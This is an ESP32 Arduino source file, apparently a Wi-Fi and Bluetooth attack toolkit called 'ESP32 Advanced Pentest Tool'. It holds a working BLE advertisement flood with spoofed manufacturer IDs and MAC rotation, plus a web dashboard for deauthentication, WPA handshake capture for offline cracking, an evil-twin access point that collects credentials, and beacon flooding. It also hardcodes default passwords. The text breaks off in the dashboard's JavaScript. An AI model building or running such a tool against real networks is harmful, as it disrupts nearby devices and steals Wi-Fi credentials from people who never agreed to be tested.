#include <ArduinoOTA.h>
#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <esp_wifi.h>
#include <SPIFFS.h>
#include <EEPROM.h>
#include <vector>
#include <algorithm>
#include "esp_wpa2.h"
#include "esp_bt.h"
#include <NimBLEDevice.h>
#include <esp_timer.h>
#include <esp_random.h>
#include <esp_task_wdt.h>
#include <ESPAsyncWebServer.h>

// ===== CONFIGURATION ===== //
#define DNS_PORT 53
#define EEPROM_SIZE 512
#define MAX_SAVED_HANDSHAKES 10
#define DEAUTH_INTERVAL 200 // ms
#define SCAN_INTERVAL 10000 // ms
#define HANDSHAKE_TIMEOUT 300000 // 5 minutes
#define WEB_USER "admin"
#define WEB_PASS "pentest123"
#define MAX_SSID_LENGTH 32
#define MIN_FLOOD_INTERVAL 20  // Minimum delay between beacons (ms)
#define MAX_FLOOD_INTERVAL 5000 // Maximum delay between beacons (ms)
#define MAX_SSID_LIST 50      // Increased from 1 to allow more SSIDs
#define DEFAULT_AP_SSID "FREE_WIFI"
#define DEFAULT_AP_PASS "pentest123"
const char* ssid = "NOT_MINE";
const char* password = "AKstore.com";
#define DEFAULT_CHANNEL 6

// ====== BLE CONFIGURATION ======
constexpr uint8_t  kNumAdvertisers       = 3;      // Use all 3 BLE channels
constexpr uint32_t kFloodIntervalUs      = 250;    // 0.25ms = ~4000 packets/sec/adv
constexpr uint8_t  kPayloadLen           = 31;     // Max BLE payload
constexpr uint32_t kMacRotationInterval  = 3000;   // Rotate MAC every 3s
constexpr int      kTxPower              = ESP_PWR_LVL_P9; // +9dBm
constexpr uint8_t  kButtonPin            = 0;      // GPIO for Start/Stop button

IPAddress apIP(192, 168, 4, 1);
IPAddress netMask(255, 255, 255, 0);
DNSServer dnsServer;
WebServer webServer(80);
AsyncWebServer asyncServer(80);

// ===== STRUCTURES ===== //
struct Network {
  String ssid;
  uint8_t bssid[6];
  uint8_t ch;
  int rssi;
  bool encrypted;
};

struct Client {
  String mac;
  int rssi;
};

struct SavedHandshake {
  String ssid;
  String bssid;
  String timestamp;
  String filename;
};

// ===== GLOBAL STATE ===== //
struct {
  bool deauthingActive = false;
  bool handshakeCaptureActive = false;
  bool evilTwinActive = false;
  bool scanningActive = false;
  bool clientScanActive = false;
  bool beaconFloodActive = false;
  String handshakeFilePath = "";
  String lastCapturedPassword = "";
  unsigned long handshakeStartTime = 0;
  bool authenticated = false;
  uint16_t floodInterval = 100; // Default interval
  uint8_t currentChannel = DEFAULT_CHANNEL;
} session;

Network selectedNetwork;
Client selectedClient;
std::vector<Network> networks;
std::vector<Client> clients;
std::vector<SavedHandshake> savedHandshakes;
std::vector<String> ssidList;
TaskHandle_t floodTaskHandle = NULL;
TaskHandle_t backgroundTaskHandle = NULL;

// ====== BLE GLOBAL STATE ======
NimBLEAdvertising* advertisers[kNumAdvertisers];
esp_timer_handle_t timers[kNumAdvertisers];
uint32_t lastMacRotate = 0;
bool floodingEnabled = false;

// ====== MANUFACTURER IDS ======
const uint16_t manufacturerIDs[] = {0x004C, 0x0075, 0x00E0, 0x015D, 0xFFFF}; // Apple, Samsung, Xiaomi, Huawei, Random

// ===== FUNCTION PROTOTYPES ===== //
void handleRoot();
void handleLogin();
void handleStatus();
void handleScanNetworks();
void handleGetNetworks();
void handleSelectNetwork();
void handleScanClients();
void handleSelectClient();
void handleDeauth();
void handleHandshake();
void handleEvilTwin();
void handleBeaconFlood();
void handleSetFloodInterval();
void handleSetFloodChannel();
void handleAddSSID();
void connectToWiFi();
void setupOTA();
void handleRemoveSSID();
void handleClearSSIDs();
void handleCloneSpecificSSID();
void handleDownloadHandshake();
void handleListHandshakes();
void handleSettings();
void handleSaveSettings();
void handleReboot();
void sendDeauthPacket();
bool captureHandshake();
void startEvilTwin(const String& unused);
void stopEvilTwin();
void scanNetworksAsync();
void scanClientsAsync();
String macToString(const uint8_t* mac);
void loadSettings();
void saveSettings();
void loadHandshakesList();
void saveHandshakeToFile(const String& ssid, const String& bssid, const uint8_t* handshake, size_t length);
void startWiFiSniffer();
void stopWiFiSniffer();
void wifiSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type);
void setupCaptivePortal();
void setupAPMode();
void setupSTAMode();
bool isAuthenticated();
void sendJSONResponse(const String& status, const String& error = "");
void startBeaconFlood();
void stopBeaconFlood();
void beaconFloodTask(void *parameter);
void sendBeacon(const String &ssid, uint8_t channel);
void generateRandomMac(uint8_t *mac);
void setWiFiChannel(uint8_t channel);
void backgroundTasks(void *pvParameters);
void cloneSpecificSSID(const String& ssid);

// ====== BLE FUNCTIONS ======
static void IRAM_ATTR flood_callback(void* arg);
void rotateMacAddress();
void scanBLEDevices();

// ===== NEW CLONE FUNCTIONS ===== //
void cloneSpecificSSID(const String& ssid) {
  ssidList.clear();            // Remove all previous SSIDs from the flood list
  ssidList.push_back(ssid);    // Add the user-selected SSID to the list
}

void handleCloneSpecificSSID() {
  if (!isAuthenticated()) {
    webServer.send(401, "application/json", "{\"status\":\"error\",\"error\":\"unauthorized\"}");
    return;
  }
  String ssid = webServer.arg("ssid");
  ssid.trim();
  if (ssid.length() == 0) {
    webServer.send(400, "application/json", "{\"status\":\"error\",\"error\":\"ssid_required\"}");
    return;
  }
  if (ssid.length() > MAX_SSID_LENGTH) {
    webServer.send(400, "application/json", "{\"status\":\"error\",\"error\":\"ssid_too_long\"}");
    return;
  }
  cloneSpecificSSID(ssid);
  webServer.send(200, "application/json", "{\"status\":\"ssid_cloned\"}");
}

// ====== FLOOD CALLBACK ======
static void IRAM_ATTR flood_callback(void* arg) {
  if (!floodingEnabled) return;

  uint8_t idx = reinterpret_cast<uintptr_t>(arg);
  uint8_t payload[kPayloadLen];
  esp_fill_random(payload, kPayloadLen);

  // Dynamic Manufacturer Spoofing
  uint16_t mfgID = manufacturerIDs[esp_random() % (sizeof(manufacturerIDs)/sizeof(manufacturerIDs[0]))];
  payload[0] = mfgID & 0xFF;
  payload[1] = (mfgID >> 8) & 0xFF;

  NimBLEAdvertisementData advData;
  advData.setManufacturerData(std::string((char*)payload, kPayloadLen));

  advertisers[idx]->setAdvertisementData(advData);
  advertisers[idx]->start();
}

// ====== MAC ROTATION ======
void rotateMacAddress() {
  uint8_t mac[6];
  esp_fill_random(mac, 6);
  mac[0] = (mac[0] & 0xFE) | 0x02; // Locally administered

  NimBLEDevice::setOwnAddrType(BLE_ADDR_RANDOM, NimBLEAddress(mac));
}

// ====== BLE SCANNER ======
void scanBLEDevices() {
  NimBLEScan* pScan = NimBLEDevice::getScan();
  pScan->setActiveScan(true);
  pScan->setInterval(100);
  pScan->setWindow(99);
  pScan->start(5, false);
}

// ===== HTML TEMPLATES ===== //
const char* loginHTML = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <title>Login</title>
  <style>
    body { font-family: Arial, sans-serif; background-color: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
    .login-box { background: #fff; padding: 20px; border-radius: 5px; box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1); width: 300px; }
    input { width: 100%; padding: 10px; margin: 10px 0; box-sizing: border-box; }
    button { background: #0078D7; color: #fff; border: none; padding: 10px; width: 100%; cursor: pointer; }
    button:hover { background: #005BB5; }
  </style>
</head>
<body>
  <div class="login-box">
    <h2>Login</h2>
    <form method="POST" action="/login">
      <input type="text" name="user" placeholder="Username" required>
      <input type="password" name="pass" placeholder="Password" required>
      <button type="submit">Login</button>
    </form>
  </div>
</body>
</html>
)rawliteral";

const char* dashboardHTML = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ESP32 Advanced Pentest Tool | CyberSecurity Suite</title>
  <style>
    :root {
  --primary: #2c3e50;
  --secondary: #34495e;
  --accent: #3498db;
  --success: #27ae60;
  --danger: #e74c3c;
  --warning: #f39c12;
  --info: #2980b9;
  --light: #ecf0f1;
  --dark: #2c3e50;
  --text-light: #ecf0f1;
  --text-dark: #2c3e50;
}

body {
  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  margin: 0;
  padding: 0;
  background-color: #f5f7fa;
  color: var(--text-dark);
  line-height: 1.6;
}

.container {
  max-width: 1200px;
  margin: 0 auto;
  padding: 20px;
}

header {
  background: linear-gradient(135deg, var(--primary), var(--secondary));
  color: var(--text-light);
  padding: 20px 0;
  margin-bottom: 30px;
  border-radius: 5px;
  box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
}

header h1 {
  margin: 0;
  padding: 0 20px;
  font-weight: 300;
  display: flex;
  align-items: center;
}

header h1::before {
  content: "🛡️";
  margin-right: 15px;
  font-size: 1.2em;
}

.card-grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
  gap: 25px;
  margin-bottom: 30px;
}

.card {
  background: white;
  border-radius: 8px;
  box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
  overflow: hidden;
  transition: transform 0.3s ease, box-shadow 0.3s ease;
  border-top: 4px solid var(--accent);
}

.card:hover {
  transform: translateY(-5px);
  box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
}

.card-header {
  background-color: var(--primary);
  color: var(--text-light);
  padding: 15px 20px;
  font-weight: 500;
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.card-body {
  padding: 20px;
}

.status-badge {
    float: right;
    padding: 5px 10px;
    border-radius: 15px;
    font-weight: 600;
    display: flex;
    align-items: center;
  }
  .status-badge .indicator {
    display: inline-block;
    width: 10px;
    height: 10px;
    margin-right: 8px;
    border-radius: 50%;
    background-color: currentColor;
    animation: pulse 1.5s infinite ease-in-out;
  }
  @keyframes pulse {
    0%, 100% {opacity: 1;}
    50% {opacity: 0.4;}
  }

.status-active {
    background-color: #28a745;
    color: white;
  }

.status-active .indicator {
  background-color: var(--success);
}
.status-inactive {
    background-color: #ddd;
    color: #666;
  }

.status-inactive .indicator {
  background-color: var(--danger);
}

.btn {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  padding: 10px 15px;
  border-radius: 5px;
  font-weight: 500;
  cursor: pointer;
  transition: all 0.2s ease;
  border: none;
  font-size: 0.9em;
  margin: 5px;
}

.btn i {
  margin-right: 8px;
}

.btn-primary {
  background-color: var(--accent);
  color: white;
}

.btn-primary:hover {
  background-color: #2980b9;
}

.btn-success {
  background-color: var(--success);
  color: white;
}

.btn-success:hover {
  background-color: #219653;
}

.btn-danger {
  background-color: var(--danger);
  color: white;
}

.btn-danger:hover {
  background-color: #c0392b;
}

.btn-warning {
  background-color: var(--warning);
  color: white;
}

.btn-warning:hover {
  background-color: #d35400;
}

.btn-info {
  background-color: var(--info);
  color: white;
}

.btn-info:hover {
  background-color: #1a5276;
}

.btn-sm {
  padding: 6px 10px;
  font-size: 0.8em;
}

.form-control {
  width: 100%;
  padding: 10px;
  border: 1px solid #ddd;
  border-radius: 5px;
  margin-bottom: 10px;
  font-size: 0.9em;
}

.form-control:focus {
  outline: none;
  border-color: var(--accent);
  box-shadow: 0 0 0 2px rgba(52, 152, 219, 0.2);
}

.form-group {
  margin-bottom: 15px;
}

.form-label {
  display: block;
  margin-bottom: 5px;
  font-weight: 500;
  font-size: 0.9em;
}

table {
  width: 100%;
  border-collapse: collapse;
  font-size: 0.9em;
}

th {
  background-color: var(--primary);
  color: white;
  padding: 12px;
  text-align: left;
}

td {
  padding: 10px 12px;
  border-bottom: 1px solid #eee;
}

tr:hover {
  background-color: #f8f9fa;
}

.badge {
  display: inline-block;
  padding: 3px 7px;
  border-radius: 3px;
  font-size: 0.75em;
  font-weight: 600;
}

.badge-success {
  background-color: rgba(39, 174, 96, 0.1);
  color: var(--success);
}

.badge-danger {
  background-color: rgba(231, 76, 60, 0.1);
  color: var(--danger);
}

.badge-info {
  background-color: rgba(52, 152, 219, 0.1);
  color: var(--info);
}

.badge-warning {
  background-color: rgba(243, 156, 18, 0.1);
  color: var(--warning);
}

.alert {
  padding: 12px 15px;
  border-radius: 5px;
  margin-bottom: 15px;
  font-size: 0.9em;
}

.alert-info {
  background-color: rgba(52, 152, 219, 0.1);
  color: var(--info);
  border-left: 4px solid var(--info);
}

.alert-warning {
  background-color: rgba(243, 156, 18, 0.1);
  color: var(--warning);
  border-left: 4px solid var(--warning);
}

.text-muted {
  color: #7f8c8d;
  font-size: 0.85em;
}

.scrollable {
  max-height: 300px;
  overflow-y: auto;
  border: 1px solid #eee;
  border-radius: 5px;
  padding: 10px;
}

.divider {
  border-top: 1px solid #eee;
  margin: 15px 0;
}

.tooltip {
  position: relative;
  display: inline-block;
}

.tooltip .tooltiptext {
  visibility: hidden;
  width: 200px;
  background-color: var(--dark);
  color: #fff;
  text-align: center;
  border-radius: 6px;
  padding: 5px;
  position: absolute;
  z-index: 1;
  bottom: 125%;
  left: 50%;
  margin-left: -100px;
  opacity: 0;
  transition: opacity 0.3s;
  font-size: 0.8em;
}

.tooltip:hover .tooltiptext {
  visibility: visible;
  opacity: 1;
}

@media (max-width: 768px) {
  .card-grid {
    grid-template-columns: 1fr;
  }
}

  </style>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
</head>
<body>
  <div class="container">
    <header>
      <h1>ESP32 Advanced Pentest Tool</h1>
    </header>
    
    <div class="card-grid">
      <!-- Status Card -->
      <div class="card">
        <div class="card-header">
          <span><i class="fas fa-heartbeat"></i> System Status</span>
          <span id="systemStatus" class="status-badge status-active">
            <span class="indicator"></span>
            <span>Online</span>
          </span>
        </div>
        <div class="card-body">
          <div class="alert alert-info">
            <i class="fas fa-info-circle"></i> Last updated: <span id="lastUpdated">Just now</span>
          </div>
          
          <div class="form-group">
            <label class="form-label">Selected Network</label>
            <div class="badge badge-info" id="selectedNetwork">None</div>
          </div>
          
          <div class="form-group">
            <label class="form-label">Selected Client</label>
            <div class="badge badge-info" id="selectedClient">None</div>
          </div>
          
          <button class="btn btn-primary" onclick="updateStatus()">
            <i class="fas fa-sync-alt"></i> Refresh Status
          </button>
        </div>
      </div>
      
      <!-- Network Scanner Card -->
      <div class="card">
        <div class="card-header">
          <span><i class="fas fa-wifi"></i> Network Scanner</span>
        </div>
        <div class="card-body">
          <button class="btn btn-primary" onclick="scanNetworks()">
            <i class="fas fa-search"></i> Scan Networks
          </button>
          
          <div class="divider"></div>
          
          <div class="scrollable">
            <table>
              <thead>
                <tr>
                  <th>SSID</th>
                  <th>Channel</th>
                  <th>Signal</th>
                  <th>Actions</th>
                </tr>
              </thead>
              <tbody id="networkList">
                <tr>
                  <td colspan="4" style="text-align: center;">No networks scanned yet</td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>
      </div>
      
      <!-- Client Scanner Card -->
      <div class="card">
        <div class="card-header">
          <span><i class="fas fa-laptop"></i> Client Scanner</span>
        </div>
        <div class="card-body">
          <div class="alert alert-warning">
            <i class="fas fa-exclamation-triangle"></i> Select a network first to scan for clients
          </div>
          
          <button class="btn btn-primary" onclick="scanClients()" id="scanClientsBtn" disabled>
            <i class="fas fa-search"></i> Scan Clients
          </button>
          
          <div class="divider"></div>
          
          <div class="scrollable" id="clientListContainer" style="display: none;">
            <table>
              <thead>
                <tr>
                  <th>MAC Address</th>
                  <th>Signal</th>
                  <th>Select</th>
                </tr>
              </thead>
              <tbody id="clientList"></tbody>
            </table>
          </div>
        </div>
      </div>
    </div>
    
    <!-- Attack Modules Section -->
    <h2 style="color: var(--primary); margin-bottom: 20px;">
      <i class="fas fa-bolt"></i> Attack Modules
    </h2>
    
    <div class="card-grid">
      <!-- Deauth Attack Card -->
      <div class="card">
        <div class="card-header">
          <span><i class="fas fa-user-slash"></i> Deauthentication Attack</span>
          <span id="deauthStatus" class="status-badge status-inactive">
            <span class="indicator"></span>
            <span>Inactive</span>
          </span>
        </div>
        <div class="card-body">
          <p class="text-muted">Disconnects clients from the selected network by sending deauthentication packets.</p>
          
          <div class="form-group">
            <label class="form-label">Target Network</label>
            <div class="badge" id="deauthNetwork">Not selected</div>
          </div>
          
          <div class="form-group">
            <label class="form-label">Target Client</label>
            <div class="badge" id="deauthClient">All clients</div>
          </div>
          
          <button class="btn btn-danger" onclick="startDeauth()">
            <i class="fas fa-play"></i> Start Attack
          </button>
          <button class="btn btn-success" onclick="stopDeauth()" disabled>
            <i class="fas fa-stop"></i> Stop Attack
          </button>
        </div>
      </div>
      
      <!-- Handshake Capture Card -->
      <div class="card">
        <div class="card-header">
          <span><i class="fas fa-handshake"></i> WPA Handshake Capture</span>
          <span id="handshakeStatus" class="status-badge status-inactive">
            <span class="indicator"></span>
            <span>Inactive</span>
          </span>
        </div>
        <div class="card-body">
          <p class="text-muted">Captures WPA handshakes for offline cracking attempts.</p>
          
          <div class="form-group">
            <label class="form-label">Target Network</label>
            <div class="badge" id="handshakeNetwork">Not selected</div>
          </div>
          
          <button class="btn btn-danger" onclick="startHandshake()">
            <i class="fas fa-play"></i> Start Capture
          </button>
          <button class="btn btn-success" onclick="stopHandshake()" disabled>
            <i class="fas fa-stop"></i> Stop Capture
          </button>
          
          <div class="divider"></div>
          
          <div id="handshakeResult" style="display: none;">
            <div class="alert alert-success">
              <i class="fas fa-check-circle"></i> Handshake captured successfully!
            </div>
          </div>
        </div>
      </div>
      
      <!-- Evil Twin Card -->
      <div class="card">
        <div class="card-header">
          <span><i class="fas fa-ghost"></i> Evil Twin Attack</span>
          <span id="evilTwinStatus" class="status-badge status-inactive">
            <span class="indicator"></span>
            <span>Inactive</span>
          </span>
        </div>
        <div class="card-body">
          <p class="text-muted">Creates a fake access point mimicking the target network to capture credentials.</p>
          
          <div class="form-group">
            <label class="form-label">Target Network</label>
            <div class="badge" id="evilTwinNetwork">Not selected</div>
          </div>
          <button class="btn btn-danger" id="startEvilTwinBtn" onclick="startEvilTwin()">
            <i class="fas fa-play"></i> Start Attack
          </button>
          <button class="btn btn-success" id="stopEvilTwinBtn" onclick="stopEvilTwin()" disabled>
            <i class="fas fa-stop"></i> Stop Attack
          </button>
      
          <!-- Captured Credentials Section -->
          <div class="captured-creds mt-4">
            <h5>Captured Credentials</h5>
            <div id="capturedCredsList" class="text-break text-monospace" style="max-height: 150px; overflow-y: auto; background:#f8f9fa; padding:10px; border-radius:5px;">
              <em>No credentials captured yet.</em>
            </div>
          </div>
        </div>
      </div>
      
    <!-- More Attack Modules -->
    <div class="card-grid">
      <!-- Beacon Flood Card -->
      <div class="card">
        <div class="card-header">
          <span><i class="fas fa-broadcast-tower"></i> Beacon Flood Attack</span>
          <span id="beaconFloodStatus" class="status-badge status-inactive">
            <span class="indicator"></span>
            <span>Inactive</span>
          </span>
        </div>
        <div class="card-body">
          <p class="text-muted">Floods the area with fake AP beacons to disrupt network scanners.</p>
          
          <div class="form-group">
            <label class="form-label">Packet Interval (ms)</label>
            <input type="number" class="form-control" id="floodInterval" min="20" max="5000" value="100">
            <button class="btn btn-sm btn-primary" onclick="setFloodInterval()">
              <i class="fas fa-save"></i> Set Interval
            </button>
          </div>
          
          <div class="form-group">
            <label class="form-label">Channel (1-14)</label>
            <input type="number" class="form-control" id="floodChannel" min="1" max="14" value="6">
            <button class="btn btn-sm btn-primary" onclick="setFloodChannel()">
              <i class="fas fa-save"></i> Set Channel
            </button>
          </div>
          
          <button class="btn btn-danger" onclick="startBeaconFlood()">
            <i class="fas fa-play"></i> Start Flood
          </button>
          <button class="btn btn-success" onclick="stopBeaconFlood()" disabled>
            <i class="fas fa-stop"></i> Stop Flood
          </button>
        </div>
      </div>
      
      <!-- SSID Management Card -->
      <div class="card">
        <div class="card-header">
          <span><i class="fas fa-list"></i> SSID Management</span>
        </div>
        <div class="card-body">
          <p class="text-muted">Manage SSIDs for beacon flood attacks.</p>
          
          <div class="form-group">
            <label class="form-label">Add SSID</label>
            <input type="text" class="form-control" id="ssidInput" placeholder="Enter SSID (max 32 chars)" maxlength="32">
            <div style="display: flex; gap: 5px;">
              <button class="btn btn-sm btn-primary" onclick="addSSID()">
                <i class="fas fa-plus"></i> Add
              </button>
              <button class="btn btn-sm btn-warning" onclick="addRandomSSID()">
                <i class="fas fa-random"></i> Random
              </button>
            </div>
          </div>
          
          <div class="form-group">
            <label class="form-label">Clone Specific SSID</label>
            <input type="text" class="form-control" id="cloneSSIDInput" placeholder="Enter SSID to clone">
            <button class="btn btn-sm btn-success" onclick="cloneSpecificSSID()">
              <i class="fas fa-copy"></i> Clone SSID
            </button>
          </div>
          
          <button class="btn btn-sm btn-danger" onclick="clearSSIDs()">
            <i class="fas fa-trash"></i> Clear All
          </button>
          
          <div class="divider"></div>
          
          <div class="scrollable">
            <div id="ssidList" class="ssid-list">
              <p class="text-muted" style="text-align: center;">No SSIDs added yet</p>
            </div>
          </div>
        </div>
      </div>
      
      <!-- BLE Flood Card -->
      <div class="card">
        <div class="card-header">
          <span><i class="fas fa-bluetooth"></i> BLE Flood Attack</span>
          <span id="bleFloodStatus" class="status-badge status-inactive">
            <span class="indicator"></span>
            <span>Inactive</span>
          </span>
        </div>
        <div class="card-body">
          <p class="text-muted">Floods the area with BLE advertisements to disrupt Bluetooth devices.</p>
          
          <button class="btn btn-danger" onclick="startBLEFlood()">
            <i class="fas fa-play"></i> Start Flood
          </button>
          <button class="btn btn-success" onclick="stopBLEFlood()" disabled>
            <i class="fas fa-stop"></i> Stop Flood
          </button>
          
          <div class="divider"></div>
          
          <button class="btn btn-info" onclick="scanBLEDevices()">
            <i class="fas fa-search"></i> Scan BLE Devices
          </button>
        </div>
      </div>
    </div>
    
    <!-- Data Section -->
    <h2 style="color: var(--primary); margin-bottom: 20px;">
      <i class="fas fa-database"></i> Data Collection
    </h2>
    
    <div class="card-grid">
      <!-- Handshakes Card -->
      <div class="card">
        <div class="card-header">
          <span><i class="fas fa-key"></i> Captured Handshakes</span>
        </div>
        <div class="card-body">
          <p class="text-muted">View and download captured WPA handshake files.</p>
          
          <button class="btn btn-primary" onclick="listHandshakes()">
            <i class="fas fa-sync-alt"></i> Refresh List
          </button>
          
          <div class="divider"></div>
          
          <div class="scrollable">
            <table>
              <thead>
                <tr>
                  <th>SSID</th>
                  <th>BSSID</th>
                  <th>Timestamp</th>
                  <th>Action</th>
                </tr>
              </thead>
              <tbody id="handshakesList">
                <tr>
                  <td colspan="4" style="text-align: center;">No handshakes captured yet</td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>
      </div>
      
      <!-- Logs Card -->
      <div class="card">
        <div class="card-header">
          <span><i class="fas fa-clipboard-list"></i> System Logs</span>
        </div>
        <div class="card-body">
          <p class="text-muted">View system activity and attack logs.</p>
          
          <button class="btn btn-primary">
            <i class="fas fa-sync-alt"></i> Refresh Logs
          </button>
          
          <div class="divider"></div>
          
          <div class="scrollable" style="height: 300px; background-color: #f8f9fa; font-family: monospace; padding: 10px; font-size: 0.85em;">
            <div id="systemLogs">
              <p>> System initialized at 14:32:45</p>
              <p>> WiFi module ready</p>
              <p>> BLE module initialized</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <script>
    // Status functions
    function updateStatus() {
      fetch('/status').then(r => r.json()).then(data => {
        // Update network selection
        const networkBadge = document.getElementById('selectedNetwork');
        networkBadge.textContent = data.selectedNetwork.ssid || 'None';
        networkBadge.className = data.selectedNetwork.ssid ? 'badge badge-success' : 'badge badge-danger';
        
        const clientBadge = document.getElementById('selectedClient');
        clientBadge.textContent = data.selectedClient.mac || 'None';
        clientBadge.className = data.selectedClient.mac ? 'badge badge-success' : 'badge badge-danger';
        
        // Update attack statuses
        updateAttackStatus('deauth', data.deauthingActive);
        updateAttackStatus('handshake', data.handshakeCaptureActive);
        updateAttackStatus('evilTwin', data.evilTwinActive);
        updateAttackStatus('beaconFlood', data.beaconFloodActive);
        updateAttackStatus('bleFlood', data.bleFloodActive);
        
        // Update attack target displays
        document.getElementById('deauthNetwork').textContent = data.selectedNetwork.ssid || 'Not selected';
        document.getElementById('deauthClient').textContent = data.selectedClient.mac || 'All clients';
        document.getElementById('handshakeNetwork').textContent = data.selectedNetwork.ssid || 'Not selected';
        document.getElementById('evilTwinNetwork').textContent = data.selectedNetwork.ssid || 'Not selected';
        
        // Enable/disable client scan button
        document.getElementById('scanClientsBtn').disabled = !data.selectedNetwork.ssid;
        
        // Update SSID list
        let ssidListHtml = '';
        if (data.ssids && data.ssids.length > 0) {
          data.ssids.forEach(ssid => {
            ssidListHtml += `
              <div style="display: flex; justify-content: space-between; align-items: center; padding: 5px 0; border-bottom: 1px solid #eee;">
                <span>${ssid}</span>
                <button class="btn btn-sm btn-danger" onclick="removeSSID('${encodeURIComponent(ssid)}')">
                  <i class="fas fa-trash"></i>
                </button>
              </div>
            `;
          });
          document.getElementById('ssidList').innerHTML = ssidListHtml;
        } else {
          document.getElementById('ssidList').innerHTML = '<p class="text-muted" style="text-align: center;">No SSIDs added yet</p>';
        }
        
        // Update flood settings
        document.getElementById('floodInterval').value = data.floodInterval;
        document.getElementById('floodChannel').value = data.currentChannel;
        
        // Update last updated time
        document.getElementById('lastUpdated').textContent = new Date().toLocaleTimeString();
      }).catch(err => {
        document.getElementById('systemStatus').className = 'status-badge status-inactive';
        document.getElementById('systemStatus').lastElementChild.textContent = 'Offline';
        console.error('Status update failed:', err);
      });
    }
    
    function updateAttackStatus(id, active) {
      const statusElem = document.getElementById(id + 'Status');
      const stopBtn = document.querySelector(`button[onclick="stop${id.charAt(0).toUpperCase() + id.slice(1)}()"]`);
      const startBtn = document.querySelector(`button[onclick="start${id.charAt(0).toUpperCase() + id.slice(1)}()"]`);
      
      if (active) {
        statusElem.className = 'status-badge status-active';
        statusElem.lastElementChild.textContent = 'Active';
        if (stopBtn) stopBtn.disabled = false;
        if (startBtn) startBtn.disabled = true;
      } else {
        statusElem.className = 'status-badge status-inactive';
        statusElem.lastElementChild.textContent = 'Inactive';
        if (stopBtn) stopBtn.disabled = true;
        if (startBtn) startBtn.disabled = false;
      }
    }
    
    // Network scanning functions
    function scanNetworks() {
      showLoader('networkList', 'Scanning networks...');
      fetch('/scanNetworks').then(r => r.json()).then(data => {
        if (data.status === 'scan_started') {
          showAlert('Network scan started. Results will appear shortly.', 'info');
          setTimeout(updateNetworkList, 5000);
        }
      });
    }
    
    function updateNetworkList() {
      fetch('/getNetworks').then(r => r.json()).then(data => {
        const table = document.getElementById('networkList');
        
        if (data.networks && data.networks.length > 0) {
          table.innerHTML = '';
          
          data.networks.forEach((net, index) => {
            const row = document.createElement('tr');
            
            const signalStrength = getSignalStrengthIndicator(net.rssi);
            
            row.innerHTML = `
              <td>${net.ssid || '<span class="text-muted">Hidden</span>'}</td>
              <td>${net.ch}</td>
              <td>
                ${signalStrength}
                <span class="text-muted">(${net.rssi} dBm)</span>
              </td>
              <td style="white-space: nowrap;">
                <button class="btn btn-sm btn-primary" onclick="selectNetwork(${index})">
                  <i class="fas fa-crosshairs"></i> Select
                </button>
                ${net.ssid ? `
                <button class="btn btn-sm btn-success" onclick="cloneNetworkSSID('${encodeURIComponent(net.ssid)}')">
                  <i class="fas fa-copy"></i> Clone
                </button>
                ` : ''}
              </td>
            `;
            
            table.appendChild(row);
          });
        } else {
          table.innerHTML = `
            <tr>
              <td colspan="4" style="text-align: center;" class="text-muted">
                No networks found or scan not completed yet
              </td>
            </tr>
          `;
        }
      });
    }
    
    function getSignalStrengthIndicator(rssi) {
      if (rssi >= -50) return `<span style="color: var(--success);"><i class="fas fa-wifi"></i> Excellent</span>`;
      if (rssi >= -60) return `<span style="color: var(--success);"><i class="fas fa-wifi"></i> Good</span>`;
      if (rssi >= -70) return `<span style="color: var(--warning);"><i class="fas fa-wifi"></i> Fair</span>`;
      return `<span style="color: var(--danger);"><i class="fas fa-wifi"></i> Weak</span>`;
    }
    
    function selectNetwork(index) {
      showLoader('networkList', 'Selecting network...');
      fetch('/selectNetwork?index=' + index).then(r => r.json()).then(data => {
        if (data.status === 'success') {
          showAlert('Network selected successfully!', 'success');
          updateStatus();
          document.getElementById('clientListContainer').style.display = 'none';
        }
      });
    }
    
    function cloneNetworkSSID(ssid) {
      if (ssid && ssid !== 'Hidden') {
        fetch('/cloneSpecificSSID', {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: 'ssid=' + ssid
        }).then(r => r.json()).then(data => {
          if (data.status === 'ssid_cloned') {
            showAlert('SSID cloned successfully!', 'success');
            updateStatus();
          } else {
            showAlert(data.error || 'Error cloning SSID', 'danger');
          }
        });
      }
    }
    
    // Client scanning functions
    function scanClients() {
      const container = document.getElementById('clientListContainer');
      const table = document.getElementById('clientList');
      
      showLoader('clientList', 'Scanning clients...');
      container.style.display = 'block';
      
      fetch('/scanClients').then(r => r.json()).then(data => {
        if (data.status === 'scan_started') {
          showAlert('Client scan started. Results will appear shortly.', 'info');
          setTimeout(() => {
            fetch('/getClients').then(r => r.json()).then(clients => {
              if (clients && clients.length > 0) {
                table.innerHTML = '';
                
                clients.forEach((client, index) => {
                  const row = document.createElement('tr');
                  const signalStrength = getSignalStrengthIndicator(client.rssi);
                  
                  row.innerHTML = `
                    <td>${client.mac}</td>
                    <td>
                      ${signalStrength}
                      <span class="text-muted">(${client.rssi} dBm)</span>
                    </td>
                    <td>
                      <button class="btn btn-sm btn-primary" onclick="selectClient(${index})">
                        <i class="fas fa-crosshairs"></i> Select
                      </button>
                    </td>
                  `;
                  
                  table.appendChild(row);
                });
              } else {
                table.innerHTML = `
                  <tr>
                    <td colspan="3" style="text-align: center;" class="text-muted">
                      No clients found or scan not completed yet
                    </td>
                  </tr>
                `;
              }
            });
          }, 5000);
        }
      });
    }
    
    function selectClient(index) {
      fetch('/selectClient?index=' + index).then(r => r.json()).then(data => {
